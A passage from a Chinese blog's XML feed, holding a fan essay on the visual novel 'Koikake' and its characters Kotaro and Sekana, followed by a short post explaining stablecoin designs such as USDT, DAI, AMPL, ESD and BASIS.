森野精华的名字和姬野星奏都很像，但是和星奏可是完全不同的人啊。星奏在洸太郎面前很少流露自己真正的忧虑和负面情感，总是被动的去回应洸太郎的想法。但是精华不一样，她就像一个小精灵一样一直围绕着洸太郎。她更像一个真实的人，表露出自己的忧虑和恐惧，真真实实地把自己的想法传达给了洸太郎。同时她也不求洸太郎的答复。真的比洸太郎棒了不知道多少倍。不像只选择了音乐的星奏，精华可是做出了一个属于成人的决定（小孩子才做选择，成年人可是所有选项都要哦。）：她同时选择演员和洸太郎。即使人远在东京，她仍旧会给洸太郎打一个电话讲述一下自己的近况。
<center>
<img class="lazyload" data-src="/static/images/koikake-2.png" height="80%" width="80%">
</center>
<h3 id="剧情">剧情</h3>
<p>洸太郎是一个很有文学天赋的少年，他在小学的时候就出版了他的第一本书，《永别了阿尔法克隆》。</p>
<p>星奏是一个很有音乐天赋的女孩，她在小学时就被经纪公司看上，参加了当红女团“Glorious Days”。</p>
<p>或许星奏和洸太郎从来就不能分开。最初的作曲比赛，星奏就是凭着自己的曲子和洸太郎写的信，完美的表达了自身的情感。离开了洸太郎的星奏，便再也听不见星之音。离开了星奏的洸太郎，时间仿佛冻结了一样。</p>
<h4 id="小学时代">小学时代</h4>
在洸太郎将信（情书）递给星奏，星奏转学后，两个人小学时代的故事便结束了。但是信却作为全文的线索，影响着洸太郎，直到洸太郎解决它。
<center>
<img class="lazyload" data-src="/static/images/koikake-3.png" height="80%" width="80%">
</center>
<p>分别后，洸太郎每天都早早地检查信箱，希望第一个看到星奏的回信。但是什么都没有。到底是星奏甩了我呢，还是由于某些原因星奏根本没有看到那封信呢？洸太郎就是这样一个纠结的人，在不断纠结和自我踏步中度过了初中。</p>
<p>洸太郎到底是什么时候喜欢上星奏的呢？大概是在一起看海的途中，听见星奏哼的歌而喜欢上这样一个轻飘飘的女孩子的。</p>
<p>年少的洸太郎与星奏相约晚上一起溜出去看海。洸太郎骑着自行车，溜出了家门，在电话亭像间谍一样给星奏打一个只响一声就挂掉的电话。洸太郎在预定集合点-公园。才等了10分钟，洸太郎就已经开始慌了。他开始揣摩星奏到底会不会来。在焦急的等待了20分钟后，星奏推着自行车的身影出现在路灯下。洸太郎并没有询问出什么，而是直接与星奏出发了。在路上，他听见了星奏哼的歌。还没来的及详细的询问，他们便遇到了巡逻的交警。洸太郎自告奋勇，自不量力的去拦下交警，为星奏争取时间。显而易见，洸太郎被交警带回了家。在父母和警察的询问下，洸太郎拒绝供出他的同伴-星奏。交警认为星奏看到洸太郎被带回了家，星奏也会自己乖乖的回家的。躺在床上的洸太郎辗转反侧，放心不下星奏。他不断的催眠自己，星奏看到自己被带走后，肯定也自己回家了。他又害怕把星奏一个人留在了海边。他也害怕自己再次前往海边会扑空。来自心底的呼唤终于冲破了洸太郎对自己的催眠，他再一次溜出了家门。自行车被锁上了，洸太郎只得自己徒步走上几个小时的行程。洸太郎在路上再次质疑自己。这份质疑又一次被自己真心的渴望给打破，洸太郎继续向前走。下雨了，本来就身体孱弱的洸太郎踉踉跄跄的继续往前走。黎明，到了。洸太郎在海边听到了星奏的歌声，找到了她。洸太郎晕了过去。星奏后来也提到，当时的自己也很害怕洸太郎不会来，相比较于做出行动，星奏选择呆在原地，等待洸太郎的行动。洸太郎最终的确在天亮的那一刻精疲力尽的来到了海滩，但是在途中，在出发前，洸太郎到底质疑了自己多少次。这或许就是星奏和洸太郎爱情的缩影。星奏说过，回到这个记忆中的小镇，她也很害怕，害怕物是人非所有人都变了。她还是回来了，但是什么都没有说。</p>
<p>星奏到底是什么时候喜欢上洸太郎的呢？ 大概是她在小学时第一次听到星之音的时候。</p>
<h4 id="高中时代">
<a href="#高中时代" class="headerlink" title="高中时代"></a>高中时代
</h4>
<p>洸太郎就这样在原地徘徊，无论是他的生活还是他的写作生涯。直到下一次和星奏的相遇，高中的一个春天，星奏又一次来到了这个小镇。两个不坦诚的人的见面是什么样的呢？他们在校门口相遇，但是都认为自己在做梦，直到在教室里的又一次相遇。</p>
<p>整个故事的线索便是洸太郎写的小说，和星奏所说的想寻找的星之音。星奏在理解洸太郎的小说，而洸太郎真的理解了星奏的星之音吗？</p>
<p>星之音包含两个意思：星奏对洸太郎的爱，星奏的创作灵感。或者说正是由于星奏对洸太郎的爱，星奏才能写出耀眼的曲子。</p>
<p>那洸太郎文为什么要写小说呢？ 他写小说是为了传达某些情感给星奏。正如洸太郎自己在文艺部活时所说： <blockquote><p>文字所表现出的美丽，恐惧。。。还有率真之类的东西，我觉得在其他事物中还是很难寻的到的。</p>
</blockquote></p>
<p>其实总是感觉星奏对洸太郎做的一切就和洸太郎对彩音做的一切一样。从邀请彩音进入文艺部开始。 <blockquote><p>彩音： 【希望你不要为了那种莫名奇妙的事情而利用我】 洸太郎： 【也不是要利用你啊】 彩音： 【那是什么？】 洸太郎： 【你要问我是什么。。。。】 【以为我们是朋友啊】</p>
</blockquote></p>
<p>洸太郎到底是为什么要保住文艺部呢？ <blockquote><p>彩音： 【为什么要保住？】 洸太郎： 【。。。。。为什么？】 我想要保住文艺部是为什么呢。 那是。。。 洸太郎： 【听你这么一说，好想并没有什么特别的理由】 嗯，没有 那。。。。。。 洸太郎： 【不保住也无所谓吧】</p>
</blockquote> <blockquote><p>其实我是知道的 虽然对新堂说没有什么特别的理由，但那也是为了遮羞。 这并不是能随便跟别人提起的话题。 莫名其妙的执着和偏爱后往往有着儿时经历的影响。 我对文艺部活动室的挂念，很容易就能追溯到拿上面。</p>
</blockquote> <blockquote><p>幼时和女孩子定下的约定。 到头来，我心中的执着都是来源于此吧。 虽然说不上是私信，但的确我太软弱了。 总之要说的话。。。。就是我多愁善感了。</p>
</blockquote></p>
<p>这些理由，有真的，也有洸太郎对自己撒谎的部分。你真的是多愁善感吗？结合这些理由，再看看彩音算不算被利用了呢？但是彩音的选择可是很坚定的呢，加入文艺部，因为她喜欢洸太郎。你却是怎么应对星奏的利用呢？在她事务所破产后，拒绝她。</p>
<p>在TE中，洸太郎曾想过，星奏到底是以怎样的心情回到这个充满回忆的小镇。未来，她 没有说。但是高中时代，她说了。 <blockquote><p>星奏： 【嗯。所以我松了口气。我很怕生。。。本来还担心转学过来能不能顺利。】</p>
</blockquote> <blockquote><p>星奏： 【我决定要回到这个城市的时候，稍微有点不安】 【因为，这个城市里有着很多美好的回忆。。。。但如果回来的话，说不定会看到完全不同的样子】 【而且我自己也和不同的了。我当时在想，这个城市是不是不会像以前那样接受我呢】 姬野的话莫名有些感伤，有些抽象。</p>
</blockquote> 回到充满回忆的地方的星奏心怀的是不安。</p>
<p>纠结了好久的洸太郎，有点明白了。 <blockquote><p>在姬野面前，无论如何都会感觉有点尴尬，我似乎明白了其中的理由。 我说不定是在心中某处抱有期待。 姬野会不会其实寄过信。。。但是因为事故之类的没有寄到。 但是，姬野看起来完全没有在意那封信。 就算是姬野，也不可能忘了我亲手交给她的信吧。 那么果然，是姬野没有做出任何回应吧。</p>
</blockquote> 还记得在招新阶影研部长所做的剧本吗？一个内心空洞的人的故事。在场的所有人除了星奏和洸太郎没有人明白那种感觉。只有这两个心灵空洞的人才明白部长的意思。</p>
<blockquote><p>洸太郎 【我的信。。。没有读吗？在那之后弄丢了？】 星奏： 【。。。。】 我看到姬野微微点了一下头。 洸太郎： 【唔啊】</p>
</blockquote>
<p>在洸太郎纠结了好久之后，他终于向星奏开口问起他写的那封信。星奏表示她读过了，但是却说如果但是她回复了洸太郎，现在就不会出现在这里了。</p>
<p>为什么星奏没有给洸太郎写回信呢？在TE中，乐队成员曾提到星奏谈起过洸太郎写给她的信。考虑到自身的利益和乐队的利益，乐队成员向星奏施压，让她丢掉那封信。但是这不是决定性的原因。在大家的印象里，星奏是一个轻柔柔的女孩子，似乎你<strong>只要</strong>态度强硬一点，她就会答应一样。其实星奏是一个很执着的女孩子，轻柔柔只是因为她不坦诚，不把自己的想法表达出来。</p>
<p>我觉得星奏没有回信的原因是她不会表达自己对洸太郎的爱恋。从乐队成员的口中，我们得知星奏在晚上睡觉的时候曾边哭边念叨着洸太郎。星奏是喜爱洸太郎的。那星奏为什么要哭呢？或许是乐队成员对星奏的排挤，但是和排挤你的人住一个房间的时候哭出来可说不通啊。星奏哭的原因是不知道如何去回应洸太郎的爱恋。星奏在文艺部的时候，曾说过她是来学习如何写信的。信在这个游戏中是传达感情的媒介。那么星奏的真正含义是我应该如何传达我对你的感情。</p>
<p>大家或许都不会忘记星奏在看到那个男孩子在糟蹋了一个女孩子的真心后的反应，星奏失控地一巴掌扇了上去。星奏真的很珍惜洸太郎所表达的爱，虽然她当时并没有回答，那么洸太郎呢？他，有好好珍惜星奏的真心吗？一个人并不是每一次都能够有勇气去表达自己的真心的。回想一下在TE中的星奏。星奏忧伤，安静，疲惫地回到了这个充满回忆的小镇。她没有传达她的想法，但是她的真心：洸太郎，我回来了。街上遇到星奏后，他们一起去吃了饭。这一次，洸太郎糟蹋了星奏的真心，“请你离开。”星奏安静的离开了。（为什么你能这么安静的离开？为什么不能传达出你的情感？明明触手可得，为什么你就不能自己伸出手出抓取你想要的。）</p>
<p>星奏说她如果回复了那封信，就不会出现在这里了是什么意思呢？星奏提到她回到镇子上的原因是想要寻找星之音。星之音只要星奏和洸太郎在一起的时候才会产生。如果星奏但是回复了那封信，毫无疑问，星奏会和洸太郎在一起。那么她还有必要回到这个小镇上来寻找星之音么？</p>
<p>星奏总是这样，一个人沉浸在自己的世界里。当她醒过来的时候，所有人都走了。</p>
<p>而洸太郎总是不断的否定自己，质疑自己。</p>
<p>在彩音线的开头，星奏的出现却是推翻了她之前自己说的话。 <blockquote><p>我看着便签，再看向姬野。 星奏： 【是以前国见君给我的】 洸太郎： 【不是弄丢了吗】 星奏： 【怎么可能弄丢啊】 洸太郎： 【什。。。可你。。。】 星奏： 【一直小心翼翼地保管着】 星奏： 【可是，现在它已经不应该属于我了】</p>
</blockquote> <blockquote><p>“虽然我也只带了一把呢”。姬野说着，笑了出来。 洸太郎： 【淋点雨也不错的】 说着，我在雨中跑了起来。 洸太郎： 【抱歉，我该走了。这个。。。谢谢你了】 星奏： 【国见君】 诶。。。 星奏： 【对不起，没能好好回复你】 原本星奏早就该说出的话语，到一切结束了才说出。然而在星奏线中，她从来都没有说出口。</p>
</blockquote></p>
<h4 id="TE">
<a href="#TE" class="headerlink" title="TE"></a>TE
</h4>
<p>在《自那之后的阿尔法克隆》的签售会上，星奏来了。《自那之后的阿尔法克隆》所表达的意思是：再见了，星奏。这份意思传达到了星奏那，与往常一样，星奏没有表达什么，她只是跟着洸太郎的脚步走。她离开了书店。虽然洸太郎追了出去，星奏也知道洸太郎在追她，或许星奏等的是一句：我爱你，留下吧。这样星奏就可以像几年前那样，留下来。</p>
成为老师后，洸太郎也是感到了愧疚，写出那本书的愧疚。这本书也让他死心了，对于以传达真实情感为目标的作家，死心了。洸太郎仍旧漫无目的在道路上寻找那个熟悉的背影，星奏 你在哪？绝对算不上偶遇的相遇，总觉得两人之间的尴尬气氛浓郁的要溢出来了。由于星奏的离开对洸太郎造成的影响，洸太郎这一次误会了星奏。 <blockquote><p>洸太郎： 【先不说我，星奏你在做些什么】 星奏： 【在做什么呢。最近我什么都没做】 洸太郎： 【真厉害啊】 星奏： 【一点都不厉害。完全不行啊】 洸太郎： 【什么都不干就能度日的话，当然厉害】 星奏： 【你好像把我当成笨蛋了？】 洸太郎： 【不是啊】 【作曲怎么样了？】 星奏： 【。。。。】 【现在停业中】</p>
</blockquote> 洸太郎明显被星奏利用怕了，不相信星奏所说的什么都没有做。还特意又问了一遍确认一下。但是真的，星奏真的不是来作曲的。直到凉介打电话告诉洸太郎，星奏的事务所倒闭后，洸太郎才恍然大悟。
<center>
<img class="lazyload" data-src="/static/images/koikake-4.png" height="80%" width="80%">
</center>
沉溺于矛盾中的洸太郎还是发现自己喜爱的就是星奏。 <blockquote><p>星奏： 【对了，我就去你那里住几天吧】 [真是个好主意。嗯] 洸太郎： 【。。。。。】 你这是什么意思 星奏： 【什么什么意思？】 洸太郎： 【你是在耍我吗】 星奏 【是吗】 【对不起啊。那么再见】 。。。。。。 洸太郎： 【等等】 星奏： 【？】 洸太郎： 【那。。。】 【那就没有办法了。。。】 星奏： 【谢谢】</p>
</blockquote> 对于洸太郎的拒绝或许我还能理解。但是伤痕累累的星奏一脸平静的说出：“是吗，那么再见。”没有任何的挣扎和反抗，顺从了洸太郎的意志，平静的令我心痛。这一幕应该是星奏最害怕遇到的。回到充满回忆的小镇，但是一切都变了，再也不复从前的美好。由于工作室破产，已经有成员负债累累尝试自杀。本来没有任何债务的星奏，毅然进场为所有人背下了债务。星奏，真的伤痕累累。上一张Glorious Days的女孩子们笑的是多么的灿烂，现在就是多么的心疼。
<center>
<img class="lazyload" data-src="/static/images/koikake-5.png" height="80%" width="80%">
</center>
<blockquote><p>从护士口中，我们得知星奏这次回来并不是为了音乐。 护士: 【但是，她经常来这里、来这里看望朋友】 【她似乎为此暂时留在了这个城市一段时间，不过她说自己要回去了】</p>
</blockquote>
<p>TE中，洸太郎和星奏第二次相遇，洸太郎终于说出了自己的心结。表现出对星奏利用自己的愤怒，但又表达“我一直等待着哪天能和你相会。”（等。。要等到什么时候。你们两个都不是擅长采取行动的的人啊）。</p>
<p>凉介作为旁观者，表达除了自己的看法。 <blockquote><p>凉介： 【想过姬野来到那所学校的理由】 【那是她处在低谷期，为了修养才回去的吧】 【是很重要的地方吧。这个城市，以及洸太郎的存在】 【但是，她选择了音乐。】</p>
</blockquote> 故事到这，结局也差不多揭示了。</p>
<p>在整个故事中，洸太郎和星奏也不断在成长。逐渐学会了如何去传达感情。洸太郎明白了：传达感情就是传达感情。当初那封信只要她读了就好了，并不要在意回答。所以洸太郎决定去追寻星奏，不论结果。星奏也开始逐渐学会传达自己的感情。从一开始，星奏便是用着和洸太郎不同的方式传达着自己的感情。与洸太郎相逢时，曲子无比的绚丽与耀眼。在桌上留下了“永别“的字条后，流传出去的只有那么几首空洞，孤独的曲子。</p>
<p>在稚嫩的时候，为了保护自己，他们选择伤害他人。后来，他们学会了寻找借口，说谎来保护自己。最后，他们看穿了对方的伪装，精确的传达着自己的爱恋。他们是情侣，我们不能从个体的角度来说对错。他们互相影响，在影响下自我修正，或许我们应该关注的是这一个整体。从稚嫩，到成熟。从互相伤害，到互相追逐，最后。。。。。。</p>
<p>充满青涩的初恋，震撼人心，却又让人捉摸不透，就和星奏的话一样。</p>
<hr>
<center>
<img class="lazyload" data-src="/static/images/koikake-gift.png" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
        <tag>想要传达给你的爱恋</tag>
        <tag>koikake</tag>
        <tag>恋×シンアイ彼女</tag>
      </tags>
  </entry>
  <entry>
    <title>稳定币简析</title>
    <url>/posts/745d9d04/</url>
    <content><![CDATA[<p>目前稳定币的总市值大约在 300 亿美金，24 小时交易量为 1000 亿美金。</p>
<a id="more"></a>
<h1 id="稳定币">稳定币</h1>
<p>缺乏约束的数字货币价格波动总是很大。这让许多习惯以美金计数的人很难受。为了解决数字货币波动性的问题，大家开始研究稳定币。稳定币一般与美元 1：1 兑换。但在实际应用中其汇率会有波动。最先出现的稳定币是基于保证金的。即每个代币背后都有大于等于 1 美金的等价资产作为抵押。</p>
<p>其中最典型的为 <a href="https://tether.to/">USDT</a> 和 <a href="https://makerdao.com/en/">DAI</a>。USDT 发行于 2014 年，是中心化稳定币的代表。每个 USDT 都有 1 美金的等价物作为担保。和银行类似，USDT 的发行公司有能力冻结用户资产。USDT 目前的市值为 $200 亿。24 小时交易量为 $600 亿。</p>
<p>DAI 则为去中心化，基于保证金的稳定币代表。同样发行于 2014 年的 DAI 市值为 $11 亿，24 小时交易量为 $3 亿。用户通过超额抵押区块链资产来铸造 DAI。用户归还 DAI 可以赎回自己的资产。目前其质押资产总额约为 $20 亿。DAI 通过改变抵押率来维持其币价。除此之外社区还充当最后的保险。如果抵押资产价格下跌至目标点位（即保证金不够了），社区将充当最后的买家。</p>
<p>基于保证金的稳定币最大问题在于其资金利用率。保证金并不能得到充分的利用。其好处便是更加稳定的价格。</p>
<p>今年出现了截然不同的算法稳定币。设计者借鉴法币的历史，基本的财政和货币政策设计出不同的算法稳定币。</p>
<p>基于通涨和通缩的算法稳定币是最早出现的。他们应用了最基本的供需理论。需求不变时，当供应减少时价格上升，供应增加时价格下降。运用到代币设计中便是当价格大于 $1 时，用户钱包里的代币数量会变多。低于 $1 时，用户钱包里的代币数量会变少。这是一个非常简单的设计，但其问题在于用户钱包里的代币数量会变换，这很反直觉。并且长期持有此代币，其价值会有巨大的变化。比较直观的理解方式是拥有 1 个代币代表拥有此代币市值的固定一部分。市值上升则我获益，市值下降则我亏损。这种稳定币的设计并不能保证此代币在长期持有的过程中有稳定的价值。这种代币的代表为 <a href="https://www.ampleforth.org/">AMPL</a>，市值为 $2.7 亿，24 小时交易量为 $900 万。</p>
<p>更为精巧的算法稳定币借鉴了央行的货币政策。当价格低于 $1 时用户可以以低于面值的价格购买债券。这些债券在价格高于 $1 时可以兑换。例如用户花价值 ​$0.6 的代币便可以买到在未来可以兑换 1 个代币的债券。此时购买债券就相当于减少代币流动性。在实际的设计中这些债券往往风险很大，因为债券可能有过期时间，兑换债券有费用，增发的代币无法满足债券的兑换需求等等。当价格高于 $1 时，代币会进行增发。一部分代币会预留给债券的兑换，另一部分代币会奖励给提供代币交易对流动性的用户。<a href="https://docs.emptyset.finance/faqs/basics">ESD</a> 便是这种设计的典型。其市值为 $4.7 亿，24 小时交易量为 $1600 万。</p>
<p>最新的算法稳定币则采用了债券和股票的机制。债券就跟我们之前讲的一样。股票则是用来分红的。当代币价格大于 $1 时，一部分增发的代币将发给股票的持有者。<a href="https://app.basis.cash/">BASIS</a> 采用了这种设计。其稳定币 BAC 市值为 ​$9000 万，24 小时交易量为 ​$3300 万。其股票 BAS 市值为 ​$1.3 亿，24 小时交易量为 $4600 万。BAS 的市值远超 BAC，颇有公司小小但是估值很高的感觉。</p>
<p>目前算法稳定币倍诟病较多的便是其债券的设计。债券风险太大并且因为技术上的原因无法在二级市场进行交易。算法稳定币相较基于保证金的稳定币没有了资金领用率的烦恼，并且不需要任何担保资金便可以启动，使其更加的灵活。或许未来能找到其他的用途。</p>
<p>经济学在稳定币的设计中越发重要。简单的供需理论便是算法稳定币的雏形。希望明年会出现设计更加巧妙的稳定币。</p>
<h1 id="reference">Reference</h1>
<p><a href="https://fairlaunch-fi.medium.com/%E7%AE%97%E6%B3%95%E7%A8%B3%E5%AE%9A%E5%B8%81%E6%8C%96%E7%9F%BF%E7%AD%96%E7%95%A5-%E5%BF%83%E5%BE%97%E4%BB%A5%E5%8F%8A%E6%9C%AA%E6%9D%A5%E7%9A%84%E5%8F%91%E5%B1%95%E8%B6%8B%E5%8A%BF-9773e5ab2569">算法稳定币挖矿策略、心得以及未来的发展趋势</a></p>
<p><a href="https://mp.weixin.qq.com/s/hvRr84HCiEj5VXbFLfKMLg">USDT、BaseCoin 和 MakerDAO 的对比：谁会胜出？</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>稳定币</tag>
        <tag>Defi</tag>
      </tags>
  </entry>
</search>
